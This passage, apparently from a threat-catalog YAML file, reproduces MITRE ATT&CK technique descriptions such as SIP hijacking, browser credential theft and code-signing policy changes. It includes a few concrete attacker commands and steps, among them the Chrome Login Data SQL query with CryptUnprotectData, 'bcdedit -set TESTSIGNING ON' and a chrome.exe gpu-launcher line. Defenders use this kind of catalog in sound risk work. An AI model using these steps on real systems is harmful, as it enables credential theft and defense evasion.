      Adversaries may also modify host networking settings that indirectly manipulate
      system firewalls, such as interface bandwidth or network connection request
      thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse
      of various [Remote Services](https://attack.mitre.org/techniques/T1021) may
      also indirectly modify firewall rules.

      https://attack.mitre.org/techniques/T1562/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560
    ref_id: T1560
    name: Archive Collected Data
    description: 'An adversary may compress and/or encrypt data that is collected
      prior to exfiltration. Compressing the data can help to obfuscate the collected
      data and minimize the amount of data sent over the network.(Citation: DOJ GRU
      Indictment Jul 2018) Encryption can be used to hide information that is being
      exfiltrated from detection or make exfiltration less conspicuous upon inspection
      by a defender.


      Both compression and encryption are done prior to exfiltration, and can be performed
      using a utility, 3rd party library, or custom method.

      https://attack.mitre.org/techniques/T1560'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.003
    ref_id: T1553.003
    name: SIP and Trust Provider Hijacking
    description: "Adversaries may tamper with SIP and trust provider components to\
      \ mislead the operating system and application control tools when conducting\
      \ signature validation checks. In user mode, Windows Authenticode (Citation:\
      \ Microsoft Authenticode) digital signatures are used to verify a file's origin\
      \ and integrity, variables that may be used to establish trust in signed code\
      \ (ex: a driver with a valid Microsoft signature may be handled as safe). The\
      \ signature validation process is handled via the WinVerifyTrust application\
      \ programming interface (API) function,  (Citation: Microsoft WinVerifyTrust)\
      \ which accepts an inquiry and coordinates with the appropriate trust provider,\
      \ which is responsible for validating parameters of a signature. (Citation:\
      \ SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable\
      \ file types and corresponding signature formats, Microsoft created software\
      \ components called Subject Interface Packages (SIPs) (Citation: EduardosBlog\
      \ SIPs July 2008) to provide a layer of abstraction between API functions and\
      \ files. SIPs are responsible for enabling API functions to create, retrieve,\
      \ calculate, and verify signatures. Unique SIPs exist for most file formats\
      \ (Executable, PowerShell, Installer, etc., with catalog signing providing a\
      \ catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017))\
      \ and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps\
      \ Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002),\
      \ adversaries may abuse this architecture to subvert trust controls and bypass\
      \ security policies that allow only legitimately signed code to execute on a\
      \ system. Adversaries may hijack SIP and trust provider components to mislead\
      \ operating system and application control tools to classify malicious (or any)\
      \ code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n*\
      \ Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in\
      \ <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType\
      \ 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic\
      \ link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function,\
      \ which retrieves an encoded digital certificate from a signed file. By pointing\
      \ to a maliciously-crafted DLL with an exported function that always returns\
      \ a known good signature value (ex: a Microsoft signature for Portable Executables)\
      \ rather than the file\u2019s real signature, an adversary can apply an acceptable\
      \ signature value to all files using that SIP (Citation: GitHub SIP POC Sept\
      \ 2017) (although a hash mismatch will likely occur, invalidating the signature,\
      \ since the hash returned by the function will not match the value computed\
      \ from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code>\
      \ Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\\
      OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point\
      \ to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function,\
      \ which validates a file\u2019s computed hash against the signed hash value.\
      \ By pointing to a maliciously-crafted DLL with an exported function that always\
      \ returns TRUE (indicating that the validation was successful), an adversary\
      \ can successfully validate any file (with a legitimate signature) using that\
      \ SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously\
      \ mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could\
      \ also be redirected to a suitable exported function from an already present\
      \ DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying\
      \ the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\\
      SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\\
      {trust provider GUID}</code> that point to the DLL providing a trust provider\u2019\
      s FinalPolicy function, which is where the decoded and parsed signature is checked\
      \ and the majority of trust decisions are made. Similar to hijacking SIP\u2019\
      s CryptSIPDllVerifyIndirectData function, this value can be redirected to a\
      \ suitable exported function from an already present DLL or a maliciously-crafted\
      \ DLL (though the implementation of a trust provider is complex).\n* **Note:**\
      \ The above hijacks are also possible without modifying the Registry via [DLL\
      \ Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\n\
      Hijacking SIP or trust provider components can also enable persistent code execution,\
      \ since these malicious components may be invoked by any application that performs\
      \ code signing or signature validation. (Citation: SpectorOps Subverting Trust\
      \ Sept 2017)\nhttps://attack.mitre.org/techniques/T1553/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1185
    ref_id: T1185
    name: Browser Session Hijacking
    description: 'Adversaries may take advantage of security vulnerabilities and inherent
      functionality in browser software to change content, modify user-behaviors,
      and intercept information as part of various browser session hijacking techniques.(Citation:
      Wikipedia Man in the Browser)


      A specific example is when an adversary injects software into a browser that
      allows them to inherit cookies, HTTP sessions, and SSL client certificates of
      a user then use the browser as a way to pivot into an authenticated intranet.(Citation:
      Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based
      behaviors such as pivoting may require specific process permissions, such as
      <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.


      Another example involves pivoting browser traffic from the adversary''s browser
      through the user''s browser by setting up a proxy which will redirect web traffic.
      This does not alter the user''s traffic in any way, and the proxy connection
      can be severed as soon as the browser is closed. The adversary assumes the security
      context of whichever browser process the proxy is injected into. Browsers typically
      create a new process for each tab that is opened and permissions and certificates
      are separated accordingly. With these permissions, an adversary could potentially
      browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002)
      or webmail, that is accessible through the browser and which the browser has
      sufficient permissions. Browser pivoting may also bypass security provided by
      2-factor authentication.(Citation: cobaltstrike manual)

      https://attack.mitre.org/techniques/T1185'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021
    ref_id: T1021
    name: Remote Services
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into a service that accepts remote connections, such as telnet, SSH,\
      \ and VNC. The adversary may then perform actions as the logged-on user.\n\n\
      In an enterprise environment, servers and workstations can be organized into\
      \ domains. Domains provide centralized identity management, allowing users to\
      \ login using one set of credentials across the entire network. If an adversary\
      \ is able to obtain a set of valid domain credentials, they could login to many\
      \ different machines using remote access protocols such as secure shell (SSH)\
      \ or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet\
      \ Remote Desktop Services) They could also login to accessible SaaS or IaaS\
      \ services, such as those that federate their identities to the domain. \n\n\
      Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072)\
      \ and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021)\
      \ to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is\
      \ native software used for remote management. ARD leverages a blend of protocols,\
      \ including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the\
      \ screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004)\
      \ for secure file transfer.(Citation: Remote Management MDM macOS)(Citation:\
      \ Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin\
      \ Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code\
      \ execution and perform lateral movement. In versions of macOS prior to 10.14,\
      \ an adversary can escalate an SSH session to an ARD session which enables an\
      \ adversary to accept TCC (Transparency, Consent, and Control) prompts without\
      \ user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote\
      \ Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop\
      \ commands)\nhttps://attack.mitre.org/techniques/T1021"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.003
    ref_id: T1071.003
    name: Mail Protocols
    description: "Adversaries may communicate using application layer protocols associated\
      \ with electronic mail delivery to avoid detection/network filtering by blending\
      \ in with existing traffic. Commands to the remote system, and often the results\
      \ of those commands, will be embedded within the protocol traffic between the\
      \ client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry\
      \ electronic mail may be very common in environments.  Packets produced from\
      \ these protocols may have many fields and headers in which data can be concealed.\
      \ Data could also be concealed within the email messages themselves. An adversary\
      \ may abuse these protocols to communicate with systems under their control\
      \ within a victim network while also mimicking normal, expected traffic.(Citation:\
      \ FireEye APT28)\nhttps://attack.mitre.org/techniques/T1071/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.007
    ref_id: T1556.007
    name: Hybrid Identity
    description: "Adversaries may patch, modify, or otherwise backdoor cloud authentication\
      \ processes that are tied to on-premises user identities in order to bypass\
      \ typical authentication mechanisms, access credentials, and enable persistent\
      \ access to accounts.  \n\nMany organizations maintain hybrid user and device\
      \ identities that are shared between on-premises and cloud-based environments.\
      \ These can be maintained in a number of ways. For example, Microsoft Entra\
      \ ID includes three options for synchronizing identities between Active Directory\
      \ and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization\
      \ (PHS), in which a privileged on-premises account synchronizes user password\
      \ hashes between Active Directory and Entra ID, allowing authentication to Entra\
      \ ID to take place entirely in the cloud \n* Pass Through Authentication (PTA),\
      \ in which Entra ID authentication attempts are forwarded to an on-premises\
      \ PTA agent, which validates the credentials against Active Directory \n* Active\
      \ Directory Federation Services (AD FS), in which a trust relationship is established\
      \ between Active Directory and Entra ID \n\nAD FS can also be used with other\
      \ SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication\
      \ process to AD FS and receive a token containing the hybrid users\u2019 identity\
      \ and privileges. \n\nBy modifying authentication processes tied to hybrid identities,\
      \ an adversary may be able to establish persistent privileged access to cloud\
      \ resources. For example, adversaries who compromise an on-premises server running\
      \ a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService`\
      \ process that authorizes all attempts to authenticate to Entra ID, as well\
      \ as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation:\
      \ AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary\
      \ may edit the `Microsoft.IdentityServer.Servicehost` configuration file to\
      \ load a malicious DLL that generates authentication tokens for any user with\
      \ any set of claims, thereby bypassing multi-factor authentication and defined\
      \ AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able\
      \ to modify the hybrid identity authentication process from the cloud. For example,\
      \ adversaries who compromise a Global Administrator account in an Entra ID tenant\
      \ may be able to register a new PTA agent via the web console, similarly allowing\
      \ them to harvest credentials and log into the Entra ID environment as any user.(Citation:\
      \ Mandiant Azure AD Backdoors)\nhttps://attack.mitre.org/techniques/T1556/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1595.002
    ref_id: T1595.002
    name: Vulnerability Scanning
    description: 'Adversaries may scan victims for vulnerabilities that can be used
      during targeting. Vulnerability scans typically check if the configuration of
      a target host/application (ex: software and version) potentially aligns with
      the target of a specific exploit the adversary may seek to use.


      These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)
      that can be used to identify more commonly known, exploitable vulnerabilities.
      Vulnerability scans typically harvest running software and version numbers via
      server banners, listening ports, or other network artifacts.(Citation: OWASP
      Vuln Scanning) Information from these scans may reveal opportunities for other
      forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).

      https://attack.mitre.org/techniques/T1595/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.009
    ref_id: T1059.009
    name: Cloud API
    description: "Adversaries may abuse cloud APIs to execute malicious commands.\
      \ APIs available in cloud environments provide various functionalities and are\
      \ a feature-rich method for programmatic access to nearly all aspects of a tenant.\
      \ These APIs may be utilized through various methods such as command line interpreters\
      \ (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell),\
      \ or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).\
      \  \n\nCloud API functionality may allow for administrative access across all\
      \ major services in a tenant such as compute, storage, identity and access management\
      \ (IAM), networking, and security policies.\n\nWith proper permissions (often\
      \ via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001)\
      \ and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)),\
      \ adversaries may abuse cloud APIs to invoke various functions that execute\
      \ malicious actions. For example, CLI and PowerShell functionality may be accessed\
      \ through binaries installed on cloud-hosted or on-premises hosts or accessed\
      \ through a browser-based cloud shell offered by many cloud platforms (such\
      \ as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment\
      \ to use CLI and/or scripting modules hosted as a container in the cloud environment.\n\
      https://attack.mitre.org/techniques/T1059/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596
    ref_id: T1596
    name: Search Open Technical Databases
    description: 'Adversaries may search freely available technical databases for
      information about victims that can be used during targeting. Information about
      victims may be available in online databases and repositories, such as registrations
      of domains/certificates as well as public collections of network data/artifacts
      gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation:
      Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation:
      DigitalShadows CDN)(Citation: Shodan)


      Adversaries may search in different open databases depending on what information
      they seek to gather. Information from these sources may reveal opportunities
      for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1596'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.015
    ref_id: T1218.015
    name: Electron Applications
    description: 'Adversaries may abuse components of the Electron framework to execute
      malicious code. The Electron framework hosts many common applications such as
      Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed
      by GitHub, Electron is a cross-platform desktop application development framework
      that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron
      3) The Chromium engine is used to display web content and Node.js runs the backend
      code.(Citation: Electron 1)


      Due to the functional mechanics of Electron (such as allowing apps to run arbitrary
      commands), adversaries may also be able to perform malicious functions in the
      background potentially disguised as legitimate tools within the framework.(Citation:
      Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow
      adversaries to execute malicious commands as child processes of the legitimate
      application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe
      /c calc.exe`).(Citation: Electron 6-8)


      Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007)
      within Electron applications.(Citation: Electron Security)

      https://attack.mitre.org/techniques/T1218/015'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.012
    ref_id: T1562.012
    name: Disable or Modify Linux Audit System
    description: 'Adversaries may disable or modify the Linux audit system to hide
      malicious activity and avoid detection. Linux admins use the Linux Audit system
      to track security-relevant information on a system. The Linux Audit system operates
      at the kernel-level and maintains event logs on application and system activity
      such as process, network, file, and login events based on pre-configured rules.


      Often referred to as `auditd`, this is the name of the daemon used to write
      events to disk and is governed by the parameters set in the `audit.conf` configuration
      file. Two primary ways to configure the log generation rules are through the
      command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing
      a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System
      Auditing)(Citation: IzyKnows auditd threat detection 2022)


      With root privileges, adversaries may be able to ensure their activity is not
      logged through disabling the Audit system service, editing the configuration/rule
      files, or by hooking the Audit system library functions. Using the command line,
      adversaries can disable the Audit system service through killing processes associated
      with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries
      can also hook Audit system functions to disable logging or modify the rules
      contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious
      activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb
      2014)

      https://attack.mitre.org/techniques/T1562/012'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1207
    ref_id: T1207
    name: Rogue Domain Controller
    description: 'Adversaries may register a rogue Domain Controller to enable manipulation
      of Active Directory data. DCShadow may be used to create a rogue Domain Controller
      (DC). DCShadow is a method of manipulating Active Directory (AD) data, including
      objects and schemas, by registering (or reusing an inactive registration) and
      simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered,
      a rogue DC may be able to inject and replicate changes into AD infrastructure
      for any domain object, including credentials and keys.


      Registering a rogue DC involves creating a new server and nTDSDSA objects in
      the Configuration partition of the AD schema, which requires Administrator privileges
      (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity
      Mimikatz Guide)


      This technique may bypass system logging and security monitors such as security
      information and event management (SIEM) products (since actions taken on a rogue
      DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique
      may also be used to alter and delete replication and other associated metadata
      to obstruct forensic analysis. Adversaries may also utilize this technique to
      perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005)
      and/or manipulate AD objects (such as accounts, access control lists, schemas)
      to establish backdoors for Persistence. (Citation: DCShadow Blog)

      https://attack.mitre.org/techniques/T1207'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.006
    ref_id: T1553.006
    name: Code Signing Policy Modification
    description: "Adversaries may modify code signing policies to enable execution\
      \ of unsigned or self-signed code. Code signing provides a level of authenticity\
      \ on a program from a developer and a guarantee that the program has not been\
      \ tampered with. Security controls can include enforcement mechanisms to ensure\
      \ that only valid, signed code can be run on an operating system. \n\nSome of\
      \ these security controls may be enabled by default, such as Driver Signature\
      \ Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation:\
      \ Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls\
      \ may be disabled by default but are configurable through application controls,\
      \ such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a\
      \ system. Since it can be useful for developers to modify default signature\
      \ enforcement policies during the development and testing of applications, disabling\
      \ of these features may be possible with elevated permissions.(Citation: Microsoft\
      \ Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may\
      \ modify code signing policies in a number of ways, including through use of\
      \ command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112),\
      \ rebooting the computer in a debug/recovery mode, or by altering the value\
      \ of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation:\
      \ Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub\
      \ Turla Driver Loader) Examples of commands that can modify the code signing\
      \ policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on\
      \ Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING\
      \ Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful\
      \ modification of a signing policy may require reboot of the compromised system.\
      \ Additionally, some implementations can introduce visible artifacts for the\
      \ user (ex: a watermark in the corner of the screen stating the system is in\
      \ Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure\
      \ BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related\
      \ to signature checks, such as modifying <code>g_CiOptions</code> to disable\
      \ Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege\
      \ Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but\
      \ vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla\
      \ Driver Loader)\nhttps://attack.mitre.org/techniques/T1553/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1610
    ref_id: T1610
    name: Deploy Container
    description: 'Adversaries may deploy a container into an environment to facilitate
      execution or evade defenses. In some cases, adversaries may deploy a new container
      to execute processes associated with a particular image or deployment, such
      as processes that execute or download malware. In others, an adversary may deploy
      a new container configured without network rules, user limitations, etc. to
      bypass existing defenses within the environment. In Kubernetes environments,
      an adversary may attempt to deploy a privileged or vulnerable container into
      a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611)
      and access other containers running on the node. (Citation: AppSecco Kubernetes
      Namespace Breakout 2020)


      Containers can be deployed by various means, such as via Docker''s <code>create</code>
      and <code>start</code> APIs or via a web application such as the Kubernetes
      dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes
      Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers
      may be deployed through workloads such as ReplicaSets or DaemonSets, which can
      allow containers to be deployed across multiple nodes.(Citation: Kubernetes
      Workload Management) Adversaries may deploy containers based on retrieved or
      built malicious images or from benign images that download and execute malicious
      payloads at runtime.(Citation: Aqua Build Images on Hosts)

      https://attack.mitre.org/techniques/T1610'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1112
    ref_id: T1112
    name: Modify Registry
    description: 'Adversaries may interact with the Windows Registry to hide configuration
      information within Registry keys, remove information as part of cleaning up,
      or as part of other techniques to aid in persistence and execution.


      Access to specific areas of the Registry depends on account permissions, some
      requiring administrator-level access. The built-in Windows command-line utility
      [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote
      Registry modification. (Citation: Microsoft Reg) Other tools may also be used,
      such as a remote access tool, which may contain functionality to interact with
      the Registry through the Windows API.


      Registry modifications may also include actions to hide keys, such as prepending
      key names with a null character, which will cause an error and/or be ignored
      when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities
      using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may
      abuse these pseudo-hidden keys to conceal payloads/commands used to maintain
      persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps
      Hiding Reg Jul 2017)


      The Registry of a remote system may be modified to aid in execution of files
      as part of lateral movement. It requires the remote Registry service to be running
      on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      are required, along with access to the remote system''s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)
      for RPC communication.

      https://attack.mitre.org/techniques/T1112'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.004
    ref_id: T1543.004
    name: Launch Daemon
    description: 'Adversaries may create or modify Launch Daemons to execute malicious
      payloads as part of persistence. Launch Daemons are plist files used to interact
      with Launchd, the service management framework used by macOS. Launch Daemons
      require elevated privileges to install, are executed for every user on a system
      prior to login, and run in the background without the need for user interaction.
      During the macOS initialization startup, the launchd process loads the parameters
      for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code>
      and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters
      include a <code>Label</code> to identify the task, <code>Program</code> to provide
      a path to the executable, and <code>RunAtLoad</code> to specify when the task
      is run. Launch Daemons are often used to provide access to shared resources,
      updates to software, or conduct automation tasks.(Citation: AppleDocs Launch
      Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd
      Keywords for plists)


      Adversaries may install a Launch Daemon configured to execute at startup by
      using the <code>RunAtLoad</code> parameter set to <code>true</code> and the
      <code>Program</code> parameter set to the malicious executable path. The daemon
      name may be disguised by using a name from a related operating system or benign
      software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When
      the Launch Daemon is executed, the program inherits administrative permissions.(Citation:
      WireLurker)(Citation: OSX Malware Detection)


      Additionally, system configuration changes (such as the installation of third
      party package managing software) may cause folders such as <code>usr/local/bin</code>
      to become globally writeable. So, it is possible for poor configurations to
      allow an adversary to modify executables referenced by current Launch Daemon''s
      plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist
      Jun 2019)

      https://attack.mitre.org/techniques/T1543/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1580
    ref_id: T1580
    name: Cloud Infrastructure Discovery
    description: "An adversary may attempt to discover infrastructure and resources\
      \ that are available within an infrastructure-as-a-service (IaaS) environment.\
      \ This includes compute service resources such as instances, virtual machines,\
      \ and snapshots as well as resources of other services including the storage\
      \ and database services.\n\nCloud providers offer methods such as APIs and commands\
      \ issued through CLIs to serve information about infrastructure. For example,\
      \ AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API\
      \ that can return information about one or more instances within an account,\
      \ the <code>ListBuckets</code> API that returns a list of all buckets owned\
      \ by the authenticated sender of the request, the <code>HeadBucket</code> API\
      \ to determine a bucket\u2019s existence along with access permissions of the\
      \ request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access\
      \ block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation:\
      \ Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation:\
      \ AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud\
      \ compute instances list</code> command to list all Google Compute Engine instances\
      \ in a project (Citation: Google Compute Instances), and Azure's CLI command\
      \ <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft\
      \ AZ CLI) In addition to API commands, adversaries can utilize open source tools\
      \ to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation:\
      \ Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate\
      \ resources using a compromised user's access keys to determine which are available\
      \ to that user.(Citation: Expel IO Evil in AWS) The discovery of these available\
      \ resources may help adversaries determine their next steps in the Cloud environment,\
      \ such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary\
      \ may also use this information to change the configuration to make the bucket\
      \ publicly accessible, allowing data to be accessed without authentication.\
      \ Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code>\
      \ to determine size, owner, permissions, and network ACLs of database resources.\
      \ (Citation: AWS Describe DB Instances) Adversaries can use this information\
      \ to determine the potential value of databases and discover the requirements\
      \ to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526),\
      \ this technique focuses on the discovery of components of the provided services\
      \ rather than the services themselves.\nhttps://attack.mitre.org/techniques/T1580"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.003
    ref_id: T1555.003
    name: Credentials from Web Browsers
    description: "Adversaries may acquire credentials from web browsers by reading\
      \ files specific to the target browser.(Citation: Talos Olympic Destroyer 2018)\
      \ Web browsers commonly save credentials such as website usernames and passwords\
      \ so that they do not need to be entered manually in the future. Web browsers\
      \ typically store the credentials in an encrypted format within a credential\
      \ store; however, methods exist to extract plaintext credentials from web browsers.\n\
      \nFor example, on Windows systems, encrypted credentials may be obtained from\
      \ Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\\
      User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT\
      \ action_url, username_value, password_value FROM logins;</code>. The plaintext\
      \ password can then be obtained by passing the encrypted credentials to the\
      \ Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019\
      s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData\
      \ April 2018)\n \nAdversaries have executed similar procedures for common web\
      \ browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential\
      \ Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores\
      \ Internet Explorer and Microsoft Edge credentials in Credential Lockers managed\
      \ by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\
      \nAdversaries may also acquire credentials by searching web browser process\
      \ memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz\
      \ July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may\
      \ attempt to recycle the credentials across different systems and/or accounts\
      \ in order to expand access. This can result in significantly furthering an\
      \ adversary's objective in cases where credentials gained from web browsers\
      \ overlap with privileged accounts (e.g. domain administrator).\nhttps://attack.mitre.org/techniques/T1555/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.008
    ref_id: T1574.008
    name: Path Interception by Search Order Hijacking
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the search order used to load other programs. Because some programs do not call
      other programs using the full path, adversaries may place their own file in
      the directory where the calling program is located, causing the operating system
      to launch their malicious software at the request of the calling program.


      Search order hijacking occurs when an adversary abuses the order in which Windows
      searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001),
      the search order differs depending on the method that is used to execute the
      program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell)
      (Citation: Microsoft WinExec) However, it is common for Windows to search in
      the directory of the initiating program before searching through the Windows
      system directory. An adversary who finds a program vulnerable to search order
      hijacking (i.e., a program that does not specify the path to an executable)
      may take advantage of this vulnerability by creating a program named after the
      improperly specified program and placing it within the initiating program''s
      directory.


      For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net
      user</code>. An adversary may place a program called "net.exe" within the same
      directory as example.exe, "net.exe" will be run instead of the Windows system
      utility net. In addition, if an adversary places a program called "net.com"
      in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will
      execute "net.com" instead of "net.exe" due to the order of executable extensions
      defined under PATHEXT. (Citation: Microsoft Environment Property)


      Search order hijacking is also a common practice for hijacking DLL loads and
      is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).

      https://attack.mitre.org/techniques/T1574/008'
